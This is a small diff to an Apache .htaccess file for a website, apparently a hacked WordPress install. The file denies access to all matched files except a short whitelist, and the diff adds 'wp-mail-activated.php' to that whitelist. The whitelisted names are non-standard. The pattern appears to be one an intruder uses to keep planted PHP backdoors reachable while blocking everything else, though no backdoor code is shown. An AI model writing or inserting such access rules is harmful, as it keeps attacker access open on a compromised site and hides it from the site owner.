@@ -14,8 +14,7 @@ ErrorDocument 403 https://coffee-2-go.ro/
 Order Allow,Deny
 Deny from all
 </FilesMatch>
-<FilesMatch "^(index.php|SSI.shtml|wp-blog-activate.php|about.php)$">
+<FilesMatch "^(index.php|SSI.shtml|wp-blog-activate.php|about.php|wp-mail-activated.php)$">
 Order Allow,Deny
 Allow from all
 </FilesMatch>
-
